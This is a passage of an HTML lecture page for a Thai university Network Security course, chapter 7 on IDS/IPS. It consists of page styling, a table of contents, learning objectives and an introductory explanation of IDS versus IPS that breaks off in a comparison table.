@@ -1,0 +1,1549 @@
+<!DOCTYPE html>
+<html lang="th" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CH-7: ระบบตรวจจับและป้องกันการบุกรุก (IDS/IPS) | วิชา Network Security</title>
+<meta name="description" content="บทที่ 7 วิชา Network Security — ระบบตรวจจับและป้องกันการบุกรุก (IDS/IPS): พื้นฐาน IDS/IPS, ประเภท IDS/IPS (NIDS/NIPS, HIDS/HIPS, WIDS, NBA), Signature-based Detection, Anomaly-based Detection, Stateful Protocol Analysis, การหลบเลี่ยงการตรวจจับ, Snort, Suricata, Zeek, การแจ้งเตือนและการตอบสนอง, AI/ML ใน IDS/IPS">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "LearningResource",
+  "name": "CH-7: ระบบตรวจจับและป้องกันการบุกรุก (IDS/IPS)",
+  "description": "บทที่ 7 ของวิชา Network Security — ครอบคลุม ความรู้เบื้องต้น IDS/IPS, ประเภทของ IDS/IPS (NIDS, HIDS, WIDS, NBA), Signature-based Detection, Anomaly-based Detection, Stateful Protocol Analysis, การหลบเลี่ยงการตรวจจับ (Fragmentation, Encoding, Encryption), Snort, Suricata, Zeek, การแจ้งเตือน การตอบสนอง และ AI/ML ใน IDS/IPS",
+  "educationalLevel": "Undergraduate",
+  "educationalRole": "Instructor",
+  "teaches": [
+    "Intrusion Detection System (IDS)",
+    "Intrusion Prevention System (IPS)",
+    "NIDS/NIPS",
+    "HIDS/HIPS",
+    "WIDS/WIPS",
+    "Network Behavior Analysis (NBA)",
+    "Signature-based Detection",
+    "Anomaly-based Detection",
+    "Stateful Protocol Analysis",
+    "Evasion Techniques",
+    "Snort IDS/IPS",
+    "Suricata IDS/IPS",
+    "Zeek NSM",
+    "SOAR",
+    "AI/ML in Intrusion Detection"
+  ],
+  "inLanguage": "th"
+}
+</script>
+<style>
+:root{--primary:#1a3a5c;--primary-dark:#0f2440;--primary-light:#2c5a8c;--accent:#2563eb;--accent-hover:#1d4ed8;--bg:#ffffff;--bg-secondary:#f8fafc;--bg-tertiary:#f1f5f9;--text:#1e293b;--text-secondary:#475569;--text-muted:#94a3b8;--border:#e2e8f0;--border-light:#f1f5f9;--code-bg:#0f172a;--code-text:#e2e8f0;--table-stripe:#f8fafc;--sidebar-bg:#f8fafc;--sidebar-border:#e2e8f0;--shadow:0 1px 3px rgba(0,0,0,0.08),0 1px 2px rgba(0,0,0,0.06);--shadow-lg:0 10px 15px -3px rgba(0,0,0,0.1),0 4px 6px -2px rgba(0,0,0,0.05);--radius:8px;--radius-sm:4px;--radius-lg:12px;--font-thai:'Sarabun','IBM Plex Sans Thai','Kanit','Noto Sans Thai',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;--font-mono:'JetBrains Mono','Fira Code','Cascadia Code','Source Code Pro','Menlo','Consolas',monospace;--transition:0.2s ease;--header-height:64px;--toc-width:280px}
+[data-theme="dark"]{--primary:#60a5fa;--primary-dark:#1e3a5f;--accent:#3b82f6;--accent-hover:#60a5fa;--bg:#0f172a;--bg-secondary:#1e293b;--bg-tertiary:#334155;--text:#f1f5f9;--text-secondary:#cbd5e1;--text-muted:#64748b;--border:#334155;--code-bg:#020617;--table-stripe:#1e293b;--sidebar-bg:#1e293b;--sidebar-border:#334155;--shadow:0 1px 3px rgba(0,0,0,0.3);--shadow-lg:0 10px 15px -3px rgba(0,0,0,0.4)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{font-family:var(--font-thai);background:var(--bg);color:var(--text);line-height:1.75;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:var(--accent);text-decoration:none;transition:color .2s ease}
+a:hover{color:var(--accent-hover);text-decoration:underline}
+h1,h2,h3,h4,h5,h6{line-height:1.3;font-weight:700;color:var(--text);margin-top:1.5em;margin-bottom:.75em}
+h1{font-size:2.25rem;margin-top:0}
+h2{font-size:1.75rem;border-bottom:2px solid var(--border);padding-bottom:.4em}
+h3{font-size:1.35rem}
+h4{font-size:1.1rem}
+p{margin-bottom:1em}
+hr{border:none;border-top:2px solid var(--border);margin:2.5em 0}
+strong,b{font-weight:700}
+ul,ol{margin-bottom:1em;padding-left:1.5em}
+li{margin-bottom:.35em}
+#loading-screen{position:fixed;inset:0;z-index:99999;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s ease,visibility .5s ease}
+#loading-screen.hidden{opacity:0;visibility:hidden;pointer-events:none}
+.loading-spinner{width:48px;height:48px;border:4px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin-bottom:1rem}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{color:var(--text-secondary);font-size:1rem}
+#progress-bar{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--accent),#818cf8);z-index:9998;width:0%;transition:width .15s ease-out}
+.top-nav{position:fixed;top:3px;left:0;right:0;z-index:9997;height:var(--header-height);background:var(--bg);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 1.25rem;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+.top-nav .logo{display:flex;align-items:center;gap:.6rem;font-weight:700;font-size:1rem;color:var(--text);white-space:nowrap}
+.top-nav .logo i{color:var(--accent);font-size:1.3rem}
+.nav-actions{display:flex;align-items:center;gap:.75rem}
+.nav-actions button,.nav-actions .search-toggle{background:none;border:1px solid var(--border);color:var(--text-secondary);width:40px;height:40px;border-radius:var(--radius);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s ease;font-size:1rem}
+.nav-actions button:hover,.nav-actions .search-toggle:hover{background:var(--bg-tertiary);color:var(--text);border-color:var(--text-muted)}
+#sidebar-toggle{display:none;background:none;border:1px solid var(--border);color:var(--text-secondary);width:40px;height:40px;border-radius:var(--radius);cursor:pointer;font-size:1.1rem;align-items:center;justify-content:center}
+.search-overlay{position:fixed;inset:0;z-index:9996;background:rgba(0,0,0,.5);display:none;align-items:flex-start;justify-content:center;padding-top:80px;backdrop-filter:blur(4px)}
+.search-overlay.active{display:flex}
+.search-panel{background:var(--bg);border-radius:var(--radius-lg);box-shadow:var(--shadow-lg);width:90%;max-width:640px;overflow:hidden;max-height:70vh;display:flex;flex-direction:column}
+.search-input-wrap{display:flex;align-items:center;padding:.75rem 1rem;border-bottom:1px solid var(--border);gap:.5rem}
+.search-input-wrap i{color:var(--text-muted)}
+.search-input-wrap input{flex:1;border:none;outline:none;background:transparent;color:var(--text);font-size:1rem;font-family:var(--font-thai)}
+.search-input-wrap input::placeholder{color:var(--text-muted)}
+.search-count{font-size:.8rem;color:var(--text-muted);white-space:nowrap;padding:.25rem .5rem;background:var(--bg-tertiary);border-radius:var(--radius-sm)}
+.search-results{overflow-y:auto;padding:.5rem;flex:1;max-height:50vh}
+.search-results .no-results{padding:2rem;text-align:center;color:var(--text-muted)}
+.search-result-item{padding:.75rem;border-radius:var(--radius);cursor:pointer;transition:background .2s ease;border-bottom:1px solid var(--border-light)}
+.search-result-item:hover{background:var(--bg-tertiary)}
+.search-result-item .result-heading{font-weight:600;font-size:.9rem;color:var(--accent);margin-bottom:.2rem}
+.search-result-item .result-snippet{font-size:.85rem;color:var(--text-secondary);line-height:1.5}
+.search-result-item .result-snippet mark,.highlight{background:#fef08a;color:#1e293b;padding:0 2px;border-radius:2px}
+[data-theme="dark"] .search-result-item .result-snippet mark,[data-theme="dark"] .highlight{background:#854d0e;color:#fef9c3}
+.layout{display:flex;padding-top:calc(var(--header-height) + 3px);min-height:100vh}
+.sidebar{width:var(--toc-width);flex-shrink:0;position:sticky;top:calc(var(--header-height) + 3px);height:calc(100vh - var(--header-height) - 3px);overflow-y:auto;background:var(--sidebar-bg);border-right:1px solid var(--sidebar-border);padding:1.25rem 1rem;scrollbar-width:thin;scrollbar-color:var(--text-muted) transparent;z-index:100}
+.sidebar::-webkit-scrollbar{width:4px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--text-muted);border-radius:4px}
+.sidebar-title{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);font-weight:600;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.toc-list{list-style:none;padding:0;margin:0}
+.toc-item{margin-bottom:.15rem}
+.toc-link{display:block;padding:.4rem .6rem;border-radius:var(--radius-sm);font-size:.85rem;color:var(--text-secondary);transition:all .2s ease;border-left:3px solid transparent;text-decoration:none;line-height:1.4}
+.toc-link:hover{background:var(--bg-tertiary);color:var(--text);text-decoration:none}
+.toc-link.active{color:var(--accent);background:rgba(37,99,235,.08);border-left-color:var(--accent);font-weight:600}
+.toc-link.sub{padding-left:1.4rem;font-size:.8rem}
+.toc-link.sub2{padding-left:2.2rem;font-size:.78rem}
+.main-content{flex:1;min-width:0;padding:2rem 2.5rem;max-width:calc(100vw - var(--toc-width))}
+.main-content>section{margin-bottom:2.5rem}
+.section-ref{scroll-margin-top:calc(var(--header-height) + 16px)}
+.hero{background:linear-gradient(135deg,var(--primary-dark),var(--primary));color:#fff;padding:2.5rem 2rem;border-radius:var(--radius-lg);margin-bottom:2.5rem}
+.hero h1{color:#fff;font-size:2rem;margin-bottom:.5rem}
+.hero .subtitle{color:rgba(255,255,255,.85);font-size:1.1rem;margin-bottom:1.25rem}
+.hero .meta-tags{display:flex;flex-wrap:wrap;gap:.5rem}
+.hero .meta-tag{background:rgba(255,255,255,.15);color:rgba(255,255,255,.9);padding:.25rem .75rem;border-radius:20px;font-size:.8rem}
+.learning-objectives{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem 2rem;margin-bottom:2rem}
+.learning-objectives h3{margin-top:0;font-size:1.1rem;color:var(--accent);display:flex;align-items:center;gap:.5rem}
+.learning-objectives ol{margin:.75rem 0 0;padding-left:1.25rem}
+.learning-objectives li{margin-bottom:.5rem;color:var(--text-secondary);font-size:.95rem}
+.table-wrap{overflow-x:auto;margin:1.25em 0;border-radius:var(--radius);border:1px solid var(--border)}
+table{width:100%;border-collapse:collapse;font-size:.9rem;min-width:500px}
+thead{background:var(--bg-tertiary)}
+th,td{padding:.6rem .85rem;text-align:left;border:1px solid var(--border);vertical-align:top}
+th{font-weight:700;color:var(--text)}
+tbody tr:nth-child(even){background:var(--table-stripe)}
+tbody tr:hover{background:var(--bg-tertiary)}
+pre{background:var(--code-bg);color:var(--code-text);border-radius:var(--radius);padding:1rem 1.25rem;overflow-x:auto;font-family:var(--font-mono);font-size:.8rem;line-height:1.6;margin:1.25em 0;position:relative}
+pre code{background:none;padding:0;color:inherit;font-size:inherit}
+code{background:var(--bg-tertiary);color:var(--accent);padding:.15em .4em;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:.85em}
+.copy-btn{position:absolute;top:.5rem;right:.5rem;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:rgba(255,255,255,.7);padding:.3rem .6rem;border-radius:var(--radius-sm);font-size:.75rem;cursor:pointer;transition:all .2s ease;opacity:0}
+pre:hover .copy-btn{opacity:1}
+.copy-btn:hover{background:rgba(255,255,255,.2);color:#fff}
+.copy-btn.copied{background:#22c55e;color:#fff;border-color:#22c55e}
+.expandable{margin:1.25em 0}
+.expandable-header{display:flex;align-items:center;justify-content:space-between;padding:.75rem 1rem;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:all .2s ease;user-select:none;font-weight:600;font-size:.95rem}
+.expandable-header:hover{background:var(--border)}
+.expandable-header i{transition:transform .2s ease;font-size:.85rem;color:var(--text-muted)}
+.expandable.expanded .expandable-header i{transform:rotate(180deg)}
+.expandable-content{max-height:0;overflow:hidden;transition:max-height .35s ease,padding .35s ease;border:1px solid transparent}
+.expandable.expanded .expandable-content{max-height:50000px;padding:1rem;border-color:var(--border);border-top:none;border-radius:0 0 var(--radius) var(--radius)}
+.quiz-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:1.25rem 1.5rem;margin-bottom:1rem;transition:all .2s ease}
+.quiz-card.revealed{border-left:4px solid #22c55e}
+.quiz-question{display:flex;gap:.75rem;align-items:flex-start}
+.q-number{background:var(--accent);color:#fff;font-weight:700;font-size:.8rem;padding:.15rem .65rem;border-radius:20px;white-space:nowrap;flex-shrink:0}
+.quiz-question p{margin:0;font-weight:500;color:var(--text);font-size:.95rem}
+.quiz-card .reveal-btn{display:inline-flex;align-items:center;gap:.4rem;margin-top:.75rem;padding:.4rem 1rem;background:var(--accent);color:#fff;border:none;border-radius:var(--radius);cursor:pointer;font-size:.85rem;font-family:var(--font-thai);transition:all .2s ease}
+.quiz-card .reveal-btn:hover{background:var(--accent-hover)}
+.quiz-card.revealed .reveal-btn{background:var(--text-muted)}
+.quiz-answer{margin-top:.75rem;padding:1rem;background:var(--bg-tertiary);border-radius:var(--radius);border:1px solid var(--border);font-size:.9rem}
+.hidden{display:none}
+#back-to-top{position:fixed;bottom:2rem;right:2rem;z-index:9995;width:44px;height:44px;border-radius:50%;background:var(--accent);color:#fff;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1.1rem;box-shadow:var(--shadow-lg);transition:all .2s ease;opacity:0;visibility:hidden;transform:translateY(10px)}
+#back-to-top.visible{opacity:1;visibility:visible;transform:translateY(0)}
+#back-to-top:hover{background:var(--accent-hover);transform:translateY(-2px)}
+.site-footer{margin-top:3rem;padding:1.5rem 2rem;background:var(--bg-secondary);border-top:1px solid var(--border);text-align:center;color:var(--text-muted);font-size:.85rem}
+@media print{.top-nav,.sidebar,#back-to-top,#progress-bar,.copy-btn,.search-overlay,#sidebar-toggle,.nav-actions{display:none!important}.layout{display:block;padding-top:0}.main-content{max-width:100%;padding:0}.hero{background:#1a3a5c!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}.hero h1,.hero .subtitle{color:#fff!important}table{font-size:.8rem}pre{white-space:pre-wrap;word-break:break-all}.expandable-content{max-height:none!important;padding:1rem!important;border-color:var(--border)!important}.expandable-header i{display:none}.table-wrap{overflow:visible}.quiz-answer.hidden{display:block!important}.quiz-card .reveal-btn{display:none}body{font-size:11pt}section{page-break-inside:avoid}h2,h3{page-break-after:avoid}}
+@media(max-width:1024px){:root{--toc-width:240px}.main-content{padding:1.5rem}}
+@media(max-width:768px){:root{--toc-width:0px}#sidebar-toggle{display:flex}.sidebar{position:fixed;left:-280px;top:calc(var(--header-height) + 3px);width:280px;height:calc(100vh - var(--header-height) - 3px);transition:left .3s ease;z-index:9990;box-shadow:var(--shadow-lg)}.sidebar.open{left:0}.sidebar-overlay{position:fixed;inset:0;z-index:9989;background:rgba(0,0,0,.4);display:none}.sidebar-overlay.active{display:block}.main-content{max-width:100%;padding:1rem}.hero{padding:1.5rem 1rem}.hero h1{font-size:1.5rem}h2{font-size:1.4rem}h3{font-size:1.15rem}.top-nav{padding:0 .75rem}.top-nav .logo{font-size:.85rem}table{font-size:.8rem}th,td{padding:.4rem .6rem}.quiz-card{padding:1rem}}
+@media(max-width:480px){.nav-actions button,.nav-actions .search-toggle{width:36px;height:36px}#back-to-top{bottom:1rem;right:1rem;width:40px;height:40px}.search-panel{width:95%}}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+</style>
+</head>
+<body>
+<div id="loading-screen" role="status" aria-label="กำลังโหลดเนื้อหา">
+  <div class="loading-spinner" aria-hidden="true"></div>
+  <div class="loading-text">กำลังโหลดเนื้อหา...</div>
+</div>
+<div id="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" aria-label="ความคืบหน้าการอ่าน"></div>
+<header class="top-nav" role="banner">
+  <div style="display:flex;align-items:center;gap:0.5rem;">
+    <button id="sidebar-toggle" aria-label="เปิดเมนูสารบัญ" aria-expanded="false"><i class="fas fa-bars"></i></button>
+    <div class="logo"><i class="fas fa-shield-halved" aria-hidden="true"></i><span>Network Security — บทที่ 7</span></div>
+  </div>
+  <div class="nav-actions">
+    <button class="search-toggle" id="search-toggle-btn" aria-label="ค้นหา" title="ค้นหา (Ctrl+K / ⌘K)"><i class="fas fa-search" aria-hidden="true"></i></button>
+    <button id="dark-mode-toggle" aria-label="สลับโหมดมืด/สว่าง" title="สลับโหมดมืด/สว่าง"><i class="fas fa-moon" aria-hidden="true"></i></button>
+  </div>
+</header>
+<div class="search-overlay" id="search-overlay" role="dialog" aria-label="ค้นหาเนื้อหา">
+  <div class="search-panel">
+    <div class="search-input-wrap">
+      <i class="fas fa-search" aria-hidden="true"></i>
+      <input type="text" id="search-input" placeholder="ค้นหาในเนื้อหาทั้งหมด..." aria-label="ป้อนคำค้นหา" autocomplete="off">
+      <span class="search-count" id="search-count"></span>
+      <button id="search-close-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:1.1rem;" aria-label="ปิดค้นหา"><i class="fas fa-times"></i></button>
+    </div>
+    <div class="search-results" id="search-results"></div>
+  </div>
+</div>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+<nav class="sidebar" id="sidebar" role="navigation" aria-label="สารบัญ">
+  <div class="sidebar-title"><i class="fas fa-list" aria-hidden="true"></i> สารบัญ</div>
+  <ul class="toc-list" id="toc-list">
+    <li class="toc-item"><a class="toc-link" href="#hero-section" data-target="hero-section">บทนำ</a></li>
+    <li class="toc-item"><a class="toc-link" href="#learning-objectives" data-target="learning-objectives">วัตถุประสงค์การเรียนรู้</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section1" data-target="section1">1. ความรู้เบื้องต้นเกี่ยวกับ IDS/IPS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-1" data-target="section1-1">1.1 IDS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-2" data-target="section1-2">1.2 IPS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-3" data-target="section1-3">1.3 IDS vs IPS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-4" data-target="section1-4">1.4 ความสัมพันธ์กับ Firewall</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section2" data-target="section2">2. ประเภทของ IDS/IPS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-1" data-target="section2-1">2.1 NIDS/NIPS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-2" data-target="section2-2">2.2 HIDS/HIPS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-3" data-target="section2-3">2.3 WIDS/WIPS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-4" data-target="section2-4">2.4 NBA</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-5" data-target="section2-5">2.5 ตารางเปรียบเทียบ</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section3" data-target="section3">3. Signature-based Detection</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-1" data-target="section3-1">3.1 หลักการ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-2" data-target="section3-2">3.2 ประเภท Signature</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-3" data-target="section3-3">3.3 Snort Rule</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-4" data-target="section3-4">3.4 ตัวอย่าง Snort Rules</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-5" data-target="section3-5">3.5 ข้อดีและข้อจำกัด</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section4" data-target="section4">4. Anomaly-based Detection</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-1" data-target="section4-1">4.1 หลักการ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-2" data-target="section4-2">4.2 ประเภท Anomaly Detection</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-3" data-target="section4-3">4.3 UEBA</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-4" data-target="section4-4">4.4 ข้อดีและข้อจำกัด</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section5" data-target="section5">5. Stateful Protocol Analysis</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-1" data-target="section5-1">5.1 หลักการ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-2" data-target="section5-2">5.2 Protocol Violation</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-3" data-target="section5-3">5.3 Request Smuggling</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-4" data-target="section5-4">5.4 ข้อดีและข้อจำกัด</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section6" data-target="section6">6. การหลบเลี่ยงการตรวจจับ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-1" data-target="section6-1">6.1 Fragmentation</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-2" data-target="section6-2">6.2 Encoding</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-3" data-target="section6-3">6.3 Encryption</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-4" data-target="section6-4">6.4 Protocol Obfuscation</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-5" data-target="section6-5">6.5 Tool-Assisted Evasion</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section7" data-target="section7">7. Snort</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-1" data-target="section7-1">7.1 ภาพรวม</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-2" data-target="section7-2">7.2 สถาปัตยกรรม</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-3" data-target="section7-3">7.3 Preprocessors</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-4" data-target="section7-4">7.4 การติดตั้ง</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-5" data-target="section7-5">7.5 Rule Set</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section8" data-target="section8">8. Suricata</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-1" data-target="section8-1">8.1 ภาพรวม</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-2" data-target="section8-2">8.2 Snort vs Suricata</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-3" data-target="section8-3">8.3 สถาปัตยกรรม Suricata</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-4" data-target="section8-4">8.4 การติดตั้ง</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-5" data-target="section8-5">8.5 Suricata Rule</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section9" data-target="section9">9. Zeek</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-1" data-target="section9-1">9.1 ภาพรวม</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-2" data-target="section9-2">9.2 สถาปัตยกรรม Zeek</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-3" data-target="section9-3">9.3 Zeek vs Snort/Suricata</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-4" data-target="section9-4">9.4 Zeek Logs</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-5" data-target="section9-5">9.5 Zeek Script</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section10" data-target="section10">10. การแจ้งเตือน การตอบสนอง และ AI</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section10-1" data-target="section10-1">10.1 แนวคิดการแจ้งเตือน</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section10-2" data-target="section10-2">10.2 SOAR</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section10-3" data-target="section10-3">10.3 AI/ML</a></li>
+    <li class="toc-item"><a class="toc-link" href="#summary" data-target="summary">สรุปท้ายบท</a></li>
+    <li class="toc-item"><a class="toc-link" href="#review-questions" data-target="review-questions">คำถามทบทวน</a></li>
+    <li class="toc-item"><a class="toc-link" href="#references" data-target="references">เอกสารอ้างอิง</a></li>
+  </ul>
+</nav>
+<main class="main-content" id="main-content" role="main">
+
+<section id="hero-section" class="hero section-ref">
+  <h1><i class="fas fa-shield-halved" aria-hidden="true"></i> CH-7: ระบบตรวจจับและป้องกันการบุกรุก (IDS/IPS)</h1>
+  <p class="subtitle">Intrusion Detection and Prevention Systems — IDS/IPS พื้นฐาน, ประเภท, เทคนิคการตรวจจับ, การหลบเลี่ยง, Snort, Suricata, Zeek, การตอบสนองอัตโนมัติ และ AI/ML</p>
+  <div class="meta-tags">
+    <span class="meta-tag"><i class="fas fa-graduation-cap" aria-hidden="true"></i> วิชา Network Security</span>
+    <span class="meta-tag"><i class="fas fa-calendar" aria-hidden="true"></i> ภาคเรียนที่ 1/2569</span>
+    <span class="meta-tag"><i class="fas fa-book-open" aria-hidden="true"></i> บทที่ 7</span>
+  </div>
+</section>
+<div class="learning-objectives section-ref" id="learning-objectives">
+  <h3><i class="fas fa-bullseye" aria-hidden="true"></i> วัตถุประสงค์การเรียนรู้ (Learning Objectives)</h3>
+  <p>เมื่อจบบทนี้แล้ว ผู้เรียนสามารถ:</p>
+  <ol>
+    <li>อธิบายความแตกต่างระหว่าง IDS, IPS และความสัมพันธ์กับ Firewall ได้</li>
+    <li>อธิบายเทคนิคการตรวจจับแบบ Signature-based, Anomaly-based, และ Behavior-based พร้อมข้อดีข้อเสีย</li>
+    <li>เปรียบเทียบระบบ NIDS/NIPS, HIDS/HIPS, WIDS, และ NBA ได้</li>
+    <li>ติดตั้งและกำหนดค่า Snort / Suricata / Zeek เพื่อตรวจจับการบุกรุกเบื้องต้นได้</li>
+    <li>เขียน Signature Rule สำหรับตรวจจับการโจมตีเฉพาะรูปแบบได้</li>
+    <li>อธิบายวิธีการหลบเลี่ยงการตรวจจับ (Fragmentation, Encoding, Encryption) และแนวทางป้องกัน</li>
+    <li>อธิบายแนวคิดการแจ้งเตือน การตอบสนองอัตโนมัติ และบทบาทของ AI/ML ใน IDS/IPS</li>
+  </ol>
+</div>
+<hr>
+
+<section id="section1" class="section-ref">
+<h2>1. ความรู้เบื้องต้นเกี่ยวกับ IDS/IPS</h2>
+
+<h3 id="section1-1" class="section-ref">1.1 IDS (Intrusion Detection System)</h3>
+<p>IDS คือระบบที่ทำหน้าที่ <strong>ตรวจจับ (Detect)</strong> การบุกรุกหรือพฤติกรรมที่ผิดปกติบนเครือข่ายหรือระบบ โดยทำงานในโหมด <strong>Passive</strong> — ตรวจสอบ Traffic และแจ้งเตือน แต่ไม่บล็อก Traffic</p>
+<p><strong>ลักษณะการทำงานของ IDS:</strong></p>
+<ul>
+  <li>รับสำเนา Traffic (ผ่าน Port Mirroring / SPAN / TAP)</li>
+  <li>วิเคราะห์หาลักษณะการโจมตี</li>
+  <li>แจ้งเตือนเมื่อตรวจพบเหตุการณ์ที่น่าสงสัย</li>
+  <li><strong>ไม่แทรกแซง</strong> Traffic จริง</li>
+</ul>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>IDS Mode:
+──────────
+Traffic Flow:  [Switch] ──(SPAN)──▶ [IDS Sensor]
+                     │                    │
+                     │              [Alert/Log]
+                     ▼
+                 [Destination]</pre>
+
+<h3 id="section1-2" class="section-ref">1.2 IPS (Intrusion Prevention System)</h3>
+<p>IPS คือระบบที่ทำหน้าที่ <strong>ป้องกัน (Prevent)</strong> การบุกรุก โดยทำงานในโหมด <strong>Inline</strong> — ตรวจสอบ Traffic แบบ Real-time และสามารถบล็อก (Block/Drop) Traffic ที่เป็นอันตรายได้ทันที</p>
+<p><strong>ลักษณะการทำงานของ IPS:</strong></p>
+<ul>
+  <li>วางอยู่ในเส้นทาง Traffic (Inline Mode)</li>
+  <li>ตรวจสอบ Traffic ทุก Packet แบบ Real-time</li>
+  <li>สามารถ Drop, Reject, หรือ Reset Connection ที่เป็นอันตราย</li>
+  <li>ทำงานที่ Latency ต่ำ (ต้องไม่เป็น Bottleneck)</li>
+</ul>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>IPS Mode:
+──────────
+Traffic Flow:  [Source] ──▶ [IPS Sensor] ──▶ [Destination]
+                                 │
+                           [Block/Drop หากพบ]</pre>
+
+<h3 id="section1-3" class="section-ref">1.3 ตารางเปรียบเทียบ IDS vs IPS</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>คุณสมบัติ</th><th>IDS</th><th>IPS</th></tr></thead>
+  <tbody>
+    <tr><td>โหมดการทำงาน</td><td>Passive (Monitor)</td><td>Inline (Active)</td></tr>
+    <tr><td>การวางตำแหน่ง</td><td>Out-of-Band (SPAN/TAP)</td><td>In-Line กับ Traffic</td></tr>
+    <tr><td>ผลกระทบต่อ Network Latency</td><td>ไม่มี (แค่ดู)</td><td>อาจมี (ขึ้นอยู่กับประสิทธิภาพ)</td></tr>
+    <tr><td>การ Block Traffic</td><td>❌ ไม่ได้</td><td>✅ Drop, Reject, Reset</td></tr>
+    <tr><td>ความเสี่ยง False Positive</td><td>ต่ำ (แค่แจ้งเตือน)</td><td>สูง (อาจ Block Traffic ปกติ)</td></tr>
+    <tr><td>ความต้องการ Resource</td><td>ปานกลาง</td><td>สูง</td></tr>
